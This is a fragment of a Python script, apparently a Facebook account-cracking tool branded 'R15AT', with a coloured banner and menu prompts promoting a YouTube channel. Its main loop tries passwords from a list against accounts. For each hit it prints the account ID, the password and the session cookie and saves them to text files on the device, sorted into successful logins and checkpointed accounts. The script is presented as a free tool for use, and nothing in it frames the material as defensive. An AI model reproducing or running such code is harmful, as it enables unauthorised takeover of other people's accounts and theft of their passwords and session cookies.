...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtube.com/@TechnicalRifat20')
        ND()
        return None
...
def ND():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] SUBSCRIBE MY 2 ND CHANNEL')
    print(' [2] EXIT')
...
\033[1;37m========================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mR15AT\33[0;m\033[1;32m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m R15AT
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mn R15AT
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m========================================
 
       \33[37;41m\t WELLCOME TO R15AT's TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(' \033[1;32m[R15AT-OK🔥]  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/R15AT-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print( '\33[1;30m[R15AT-CP🐸]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/R15AT-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[N4H1D] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
